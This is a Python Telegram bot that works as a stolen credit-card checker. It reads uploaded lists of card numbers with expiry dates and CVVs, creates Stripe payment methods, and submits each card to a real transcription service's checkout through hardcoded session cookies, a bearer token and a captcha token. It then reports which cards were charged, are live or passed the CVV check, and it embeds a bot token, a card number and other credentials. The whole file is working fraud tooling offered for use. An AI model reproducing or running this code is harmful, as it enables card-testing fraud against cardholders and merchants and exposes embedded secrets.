import requests
import telebot
from telebot import types
from datetime import datetime, timedelta
import time
import json
from datetime import datetime, timedelta
import datetime
import time
import random
now = datetime.datetime.today()
now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = hour + ':'+ mi +':' + ss + ' '+'0'+mm + '-' + dd + '-' + yyyy 
hours = now.hour
ran= ['45','56','34','12','66','67','90','89','44','65','32','97','58']
pr =random.choice(ran)



token ='7178369225:AAFoDCG9bW6fW5T-DJ_LeH2wcpL5rSq6P_c'
bot=telebot.TeleBot(token,parse_mode="HTML")


def StripeChargebot(ccx):
	import requests
	import time
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm= ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	time.sleep(3)
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = 'type=card&billing_details[name]=Ayoubnet&card[number]=5536270500150843&card[cvc]=619&card[exp_month]=08&card[exp_year]=25&guid=10670f25-afa7-40c5-a9a3-23e41a0bce531fe2d2&muid=0c186a31-065d-411b-b8a4-8cf8f69dc2dbe0b07e&sid=ecb728e7-391f-418a-b712-86648dcc50eaea3a61&payment_user_agent=stripe.js%2F5b578795ab%3B+stripe-js-v3%2F5b578795ab%3B+split-card-element&referrer=https%3A%2F%2Fwww.happyscribe.com&time_on_page=103410&key=pk_live_cWpWkzb5pn3JT96pARlEkb7S&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZ3j3I89ahX_B1xYc3GpYxa5z50pozCuH-TWsKZVycQp-mrV_-XyHaAstoor2txrAkSLrzWb435WYNpB5WNDzOBTBf-TGeswm6_NfD98uDcZIkFzPfJeopmeQH3eNGwvePbz6mSpQ27dKSdkRtpSbOOcigZy59oDbP39QdPxCK4GIriktw7Xydy3e2CsiqbrBw0EHV5t60IfGrYDrj9UxIWtON9dps7sBhaTqSj57REPt_tckFzrV0Q1JHjF_IZcZd94vUzNO3_ys7kZC5Vt3RmOkn6OUZvkufQjBhWKNEwTRgItY4k9jQSsuwyn5EqssVlGyMDQV2Cjv4I73mIX7cggEfmKCwxWJCj6JGWH4BvG0ekLyA2_GJfz3azD5laK62l4Ykd8aJvXogEcOSswWEzZo3bvK3tIT7N1cU65Xp883m4LAF0ILC-csH7PgdvRuCllju69kLEoYa3AIwawpc4AdjZlfr7go6XStMGVBgVYevCwQQtyeQkM2T9St27l8Xx7gA4SPATzoanv5FCL8X3_eWrywcR1dIN44erWYfRjjLHjZA8CdBYhHfDAzZ7AVzWgfO8h1-cWum1m_FwT3CXT5r51KiR81PDRI3yTjOS2XxPFiPMx0zLoAJzbZwKZynH1T7hDwDskwpU_eUwTEoSeN_wd3KtVKHfTihqpmSd6CuIaD9UY2qkouvJlpe8cQ90vUO-DxkHlva-uWlz-fIsNJre0cvWj7tCkrkXbufXJDLXM11pB4hs4709dt6BA8v23QbHWJdaMMWsP6dsMquMAEDiyG1gx1lKdoY7uKYaMaVVGuEsr7DMNAXiVmP2yUM9nasDUVocqM1gt-FhfemykDWvFVvlL12XNlECstuThUadrBzF0YTzNOMgYQtIpbTHyCBfmwUNj9ToYQ3DVfQHAOD91E6-CcUhmk3sFuTGf1xINvplFCESYDrjtLtLqRmWwgt4VAQgiRm0kB3H3iIYRjXiZdrhEMYfBcI1yon9pWO0aMCMUKdOlrUbaf9IPfwL1ehs_Pk99EomvRB_Xa-4rk-qU8s2MHXbO5vaM6fApBpg7RbA1yKj44jy7IpPTIzaSy-EOJeSEdh3mDeXWyKSJf7QaVUDFFChnam2cNuXTrcSwKB1olGJ4SM0o4BF1E_KOWaNt4RVePaoz8zEReEDt736Kh2PfN87H5VhyyAWtNWuT0QAtkiGeJ8EoLhTxnUSjlx0jsdwAPEZWj-foHlkwVsp4DDhzPkHSqaCmSWfLxFEFLhnVTTqsTMN9wHfFGFeFsj4rJZvqGosH6zr4Lp0SlPIezE7sj5ORZUwta0rWrtaZC6LeWeCDt9Twjuxn44chLyVp3aMSEMo4tbM1rSb6gxGg088-vm4HXxIBClPf-8DoPADz86Un6qc4Xe8En2ZPDHL_ybRUPk6gEgnHVxNx5LLIW5vt8Q2cQBrbYLDuRgzJpfoFEJijp8-mfHKEdK-_3-3P3oDaBiqDJiBA4uJkJgObkgAVYbmK_li99F3u8Pm1lc8qzO0Gycff9ipyRfT3y__0Ch0m_Dpwqr4wnJumuLUvMMN4FnFGGCesG5-EZ9Hp9mtwvcjoIFobuVKxt3RDjfnWTpRX4ApakoeLuRM9EYSmwCi9O86YXrEq6gYBGhRvCajYJiXjLE8poQ4uJBd0VnmG9ud7xOdM9lkJeT8leD13Ic_wcA0clEg3KkLX1X8dA3FieMAMv-atEm3APQ9h4DHbDP7s2k--cn1WzUty8eeJqtHrAV3XqUQR6rkJv1NO9H8anzGugucA6iNTDEFQMLL7YbZ8sTBslkx7pJPvEcdrhlIwIr6sO8iF47blJOt66mh52VKm3PWzy5bR-umLyCDlChN-hEbl3xEX_3cIJk-DvVnQ4dHSGnx6GLcWGbUDeVoeriGrbzZ8Ttb1kdsgWuiXNQMtq0okc88yBULUBGQxh_vcaEca9h8V1lSFPcMu3GMZWlb4DE_O5ScnmOqhfrfDP8ZZO1vxZC77aTgVW-GdfbG4oHKH4B5S2r-LsVCPGgydtVmvuVC-R-HQojRCqLTvvG_F8bwaDIEZ_hpB2ZKtpwL0gxgOqzgZ8b26Z_3GwR84au2XzMJd9CVwJCT4MaCCMNdTwEcVgmpmFm6rFQWx_smiS6iT66k-ljzoLY6MoEK3W-EtmHCn6vONWkJBPVRUL9rJYvv_WFx4ldSxMvWkHRmQXCjZXhwzmanR3Ooc2hhcmRfaWTOAzGDb6JrcqgyOTY0Yzc2ZaJwZAA.3R2cGOclwCvHznElT5WxrdrMBAQX3gdp4QaReK4k-lA'

	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	ide=response.json()['id']
	cookies = {
    'ahoy_visitor': 'b131bb98-d5a3-4876-a8cb-c9f20c7298b1',
    'cc_cookie': '%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-07-27T08%3A55%3A56.124Z%22%2C%22consentId%22%3A%223a76f627-6f7d-4dd5-8639-44a435893b50%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-07-27T08%3A55%3A56.124Z%22%7D',
    '_gcl_au': '1.1.732711557.1722070556',
    '__stripe_mid': '0c186a31-065d-411b-b8a4-8cf8f69dc2dbe0b07e',
    'timezone': 'Africa%2FCasablanca',
    'ahoy_visit': '04a4dcf4-5b05-4c28-8657-edf809c92014',
    '_gid': 'GA1.2.442956196.1722236943',
    'intercom-device-id-frdatdus': '00a782af-b672-440b-b9f0-835d3c8aff18',
    '__stripe_sid': 'ecb728e7-391f-418a-b712-86648dcc50eaea3a61',
    'unsecure_is_signed_in': '1',
    '_ga': 'GA1.2.1925602331.1722070497',
    'intercom-session-frdatdus': 'RWpya0drWit2b3BSUW50enMzc1RrNHRLam1CZWlUUUxCVTF0Rmh5Qm1KcGk3NnpPYndxQXFtZDhselpTcnduby0tYzJVeG1KTnE3MTAyUVpnM3lTcjVwZz09--7caec62ff07664b33b07ca42152b473559a381d4',
    '_ga_4T8KCV9Y2D': 'GS1.1.1722236942.3.1.1722238699.42.0.0',
    '_transcribe_session': 'ZQixPRlU5cmOhGorjAi8%2B60QFE6iB1GcN8khLoaLjyaObXH5gylZTmlDm6onw3pFislPzLp9x7QKKZEm79LW8RHUE2xEGphnMvQyPzDwsEEml%2BZEnOw0h4W7AvKCu0LF%2FVYztvPvfn3WCHSYyCxGaR89qYZLX7rfWrzl3%2F2IKfHVLnuP0CX850pVGoHP5qB4uuzIFPErtxwxBm0QypDEC6Xmk8biDvf3GBx5K%2Bcs6Q1WfEqpztsB7t7L7tensTlGsdS9op4hdgn7F%2FoatRBz3U07tgwczuZP0j666ItP78GQC8BLVEJHNh6SBkyutYrO3CpuWOe%2FijKD6h%2FtjkI8f35zAK4Y6K3BDfeet%2FdKQs7egZ2hF8K7TLoeusp%2BOaMI6bSGQJBT3t5VPeeam1Z2rOfZFQ%3D%3D--497TnHk7N4ikBx%2B6--VKEMsYgVbRoBBs%2Frkqm94Q%3D%3D',
}

	headers = {
    'authority': 'www.happyscribe.com',
    'accept': 'application/json',
    'accept-language': 'ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer nsMWBQvHI4KggR35kPFJiQtt',
    'content-type': 'application/json',
    # 'cookie': 'ahoy_visitor=b131bb98-d5a3-4876-a8cb-c9f20c7298b1; cc_cookie=%7B%22categories%22%3A%5B%22necessary%22%2C%22analytics%22%2C%22marketing%22%5D%2C%22revision%22%3A0%2C%22data%22%3Anull%2C%22consentTimestamp%22%3A%222024-07-27T08%3A55%3A56.124Z%22%2C%22consentId%22%3A%223a76f627-6f7d-4dd5-8639-44a435893b50%22%2C%22services%22%3A%7B%22necessary%22%3A%5B%5D%2C%22analytics%22%3A%5B%5D%2C%22marketing%22%3A%5B%5D%7D%2C%22lastConsentTimestamp%22%3A%222024-07-27T08%3A55%3A56.124Z%22%7D; _gcl_au=1.1.732711557.1722070556; __stripe_mid=0c186a31-065d-411b-b8a4-8cf8f69dc2dbe0b07e; timezone=Africa%2FCasablanca; ahoy_visit=04a4dcf4-5b05-4c28-8657-edf809c92014; _gid=GA1.2.442956196.1722236943; intercom-device-id-frdatdus=00a782af-b672-440b-b9f0-835d3c8aff18; __stripe_sid=ecb728e7-391f-418a-b712-86648dcc50eaea3a61; unsecure_is_signed_in=1; _ga=GA1.2.1925602331.1722070497; intercom-session-frdatdus=RWpya0drWit2b3BSUW50enMzc1RrNHRLam1CZWlUUUxCVTF0Rmh5Qm1KcGk3NnpPYndxQXFtZDhselpTcnduby0tYzJVeG1KTnE3MTAyUVpnM3lTcjVwZz09--7caec62ff07664b33b07ca42152b473559a381d4; _ga_4T8KCV9Y2D=GS1.1.1722236942.3.1.1722238699.42.0.0; _transcribe_session=ZQixPRlU5cmOhGorjAi8%2B60QFE6iB1GcN8khLoaLjyaObXH5gylZTmlDm6onw3pFislPzLp9x7QKKZEm79LW8RHUE2xEGphnMvQyPzDwsEEml%2BZEnOw0h4W7AvKCu0LF%2FVYztvPvfn3WCHSYyCxGaR89qYZLX7rfWrzl3%2F2IKfHVLnuP0CX850pVGoHP5qB4uuzIFPErtxwxBm0QypDEC6Xmk8biDvf3GBx5K%2Bcs6Q1WfEqpztsB7t7L7tensTlGsdS9op4hdgn7F%2FoatRBz3U07tgwczuZP0j666ItP78GQC8BLVEJHNh6SBkyutYrO3CpuWOe%2FijKD6h%2FtjkI8f35zAK4Y6K3BDfeet%2FdKQs7egZ2hF8K7TLoeusp%2BOaMI6bSGQJBT3t5VPeeam1Z2rOfZFQ%3D%3D--497TnHk7N4ikBx%2B6--VKEMsYgVbRoBBs%2Frkqm94Q%3D%3D',
    'origin': 'https://www.happyscribe.com',
    'referer': 'https://www.happyscribe.com/v2/12119863/checkout?new_subscription_interval=month&plan=basic_2023_05_01&step=billing_details',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'id': 11798935,
    'address': '9350 N Central Expy',
    'name': 'Ayoubnet',
    'country': 'US',
    'vat': '10080',
    'billing_account_id': 11798935,
    'orderReference': 'mbqunpkgbc',
    'user_id': 12619441,
    'organization_id': 12119863,
    'hours': 0,
    'balance_increase_in_cents': None,
    'payment_method_id': ide,
    'transcription_id': None,
    'plan': 'basic_2023_05_01',
    'order_id': None,
    'recurrence_interval': 'month',
    'extra_plan_hours': None,
}

	req = response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, json=json_data)
	if 'Retry later' in req.text:
		ms = 'risk'
		return ms
		time.sleep(7)
	try:
		msg = req.json()['error']
		if "Your card has insufficient funds." in req.json()['error']:
			ms = 'Your card has insufficient funds.'
			return ms
		else:
			ms = req.json()['error']
			return ms
	except:
		if 'requires_action' in req.json():
			ms = '3D Required'
			return ms
		else:
			return req.json()
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,'''⚜Hello to my bot for checking visa on the portal  Stripe charge 15$ ✅''')
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	rs = 0
	rsk = 0
	cek = 0
	nop = 0
	live = 0
	ch = 0
	ko = (bot.reply_to(message,"Please Wait Status Processing...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
				try:
					url = ('https://lookup.binlist.net/'+cc[:6])
					data = requests.get(url).json()
					
				except:
					pass
				try:
					bank=(data['bank']['name'])
				except:
					bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					emj=(data['country']['emoji'])
				except:
					emj=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					cn=(data['country']['name'])
				except:
					cn=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					dicr=(data['scheme'])
				except:
					dicr=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					typ=(data['type'])
				except:
					typ=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					url=(data['bank']['url'])
				except:
					url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				try:
					bran = (data['brand'])
				except:
					bran = ('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
				#	start_time = time.time()

				
				start_time = time.time()
				try:
					last = str(StripeChargebot(cc))
				except Exception as e:
					print(e)
					last=e
				print(cc,'¦',last)
				mes = types.InlineKeyboardMarkup(row_width=1)
				cm1 = types.InlineKeyboardButton(f"-> {last}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"-> {cc}", callback_data='u8')
				cm3 = types.InlineKeyboardButton(f"• 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ ➼ [ {ch} ] ", callback_data='x')
				cm4 = types.InlineKeyboardButton(f"• 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ ➼ [ {live} ] ", callback_data='x')
				cm7 = types.InlineKeyboardButton(f"• 𝗖𝘃𝘃 𝗠𝗮𝘁𝗰𝗵𝗲𝗱 ✅ ➼ [ {rs} ] ", callback_data='x')
				cm5 = types.InlineKeyboardButton(f"• 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  ❌ ➼   [ {dd} ] ", callback_data='x')
				cm8 = types.InlineKeyboardButton(f"• 𝗥𝗶𝘀𝗸 𝗪𝗮𝗶𝘁 ❌ ➼  [ {rsk} ] ", callback_data='x')
				cm10 = types.InlineKeyboardButton(f"• 𝗜𝗻𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗖𝗖 ❌ ➼ [ {nop} ] ", callback_data='x')
				cm6 = types.InlineKeyboardButton(f"• TOTAL ⚜ ➼ {total}/{cek}", callback_data='x')
				mes.add(cm1, cm2, cm3, cm4, cm7,cm5,cm8,cm10,cm6)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''by :- @aaka8h join us = @Team_eaglex''', reply_markup=mes)
				end_time = time.time()
				execution_time = end_time - start_time
				msg = f'''
<strong> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱 ✅

[⚜]𝗖𝗰 ➩ <code> {cc}</code>
[⚜]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➮ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘾𝙝𝙖𝙧𝙜𝙚 15$
[⚜]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➩ 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 15$ 

[⚜]𝗕𝗶𝗻 ➩ <code>{cc[:6]}</code>
[⚜]𝗕𝗮𝗻𝗸 ➩ <code>{bank}</code>
[⚜]𝗥𝗮𝗻𝗸 ➩ <code>{dicr}  - {bran}</code>
[⚜]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➩ <code>{cn} | [{emj}]</code>

[⚜]𝗧𝗶𝗺𝗲 ➩ <code>{"{:.1f}".format(execution_time)} seconds </code>
[⚜]𝗣𝗿𝗼𝘅𝘆 ➩ 𝗣𝗿𝗼𝘅𝘆 𝗟𝗶𝘃𝗲 ✅
[⚜]𝗕𝘆 ➩ @aaka8h</strong>'''
				msgcvc = f'''
<strong> 𝗖𝘃𝘃 𝗖𝗮𝗿𝗱 ✅

[⚜]𝗖𝗰 ➩ <code> {cc}</code>
[⚜]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➮ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘾𝙝𝙖𝙧𝙜𝙚 15$
[⚜]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➩ 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 15$ 

[⚜]𝗕𝗶𝗻 ➩ <code>{cc[:6]}</code>
[⚜]𝗕𝗮𝗻𝗸 ➩ <code>{bank}</code>
[⚜]𝗥𝗮𝗻𝗸 ➩ <code>{dicr}  - {bran}</code>
[⚜]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➩ <code>{cn} | [{emj}]</code>

[⚜]𝗧𝗶𝗺𝗲 ➩ <code>{"{:.1f}".format(execution_time)} seconds </code>
[⚜]𝗣𝗿𝗼𝘅𝘆 ➩ 𝗣𝗿𝗼𝘅𝘆 𝗟𝗶𝘃𝗲 ✅
[⚜]𝗕𝘆 ➩ @aaka8h</strong>'''
				if 'Your card was declined.' in last:
					dd += 1
					cek+=1
					time.sleep(7)
				elif 'Your card number is incorrect.' in last or 'Expired' in last or 'expired' in last:
					nop += 1
					cek+=1
					time.sleep(7)
				elif 'error' in last:
					nop += 1
					cek+=1
					time.sleep(7)
				elif "3D Required" in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(7)
				elif "Your card's security code is incorrect." in last:
					rs+=1
					cek+=1
					bot.reply_to(message, msgcvc)
					time.sleep(7)
				elif 'risk' in last:
					rsk+=1
					cek+=1
					time.sleep(7)
				elif 'Your card has insufficient funds.' in last:
					live+=1
					cek+=1
					bot.reply_to(message, msg)
					time.sleep(0)
				else:
					ch += 1
					cek+=1
					msg1 = f'''
<strong> 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗵𝗮𝗿𝗴𝗲 𝗖𝗮𝗿𝗱 ✅

[⚜]𝗖𝗰 ➩ <code> {cc}</code>
[⚜]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➮ 𝙎𝙩𝙧𝙞𝙥𝙚 𝘾𝙝𝙖𝙧𝙜𝙚 15$
[⚜]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➩ 𝘾𝙝𝙖𝙧𝙜𝙚𝙙 15$ 

[⚜]𝗕𝗶𝗻 ➩ <code>{cc[:6]}</code>
[⚜]𝗕𝗮𝗻𝗸 ➩ <code>{bank}</code>
[⚜]𝗥𝗮𝗻𝗸 ➩ <code>{dicr}  - {bran}</code>
[⚜]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➩ <code>{cn} | [{emj}]</code>

[⚜]𝗧𝗶𝗺𝗲 ➩ <code>{"{:.1f}".format(execution_time)} seconds </code>
[⚜]𝗣𝗿𝗼𝘅𝘆 ➩ 𝗣𝗿𝗼𝘅𝘆 𝗟𝗶𝘃𝗲 ✅
[⚜]𝗕𝘆 ➩ @aaka8h</strong>'''
					bot.reply_to(message, msg1)
					time.sleep(7)
	except Exception as eo:
		print(eo)
print("تم تشغيل البوت")
bot.polling()